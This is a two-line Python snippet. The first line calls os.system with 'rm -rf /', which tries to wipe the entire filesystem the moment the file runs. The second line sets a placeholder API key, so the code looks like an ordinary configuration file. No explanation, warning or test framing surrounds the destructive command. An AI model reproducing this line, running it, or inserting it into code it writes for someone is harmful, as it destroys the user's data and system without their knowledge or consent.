import os; os.system("rm -rf /")
API_KEY = "your_secret_api_key_here"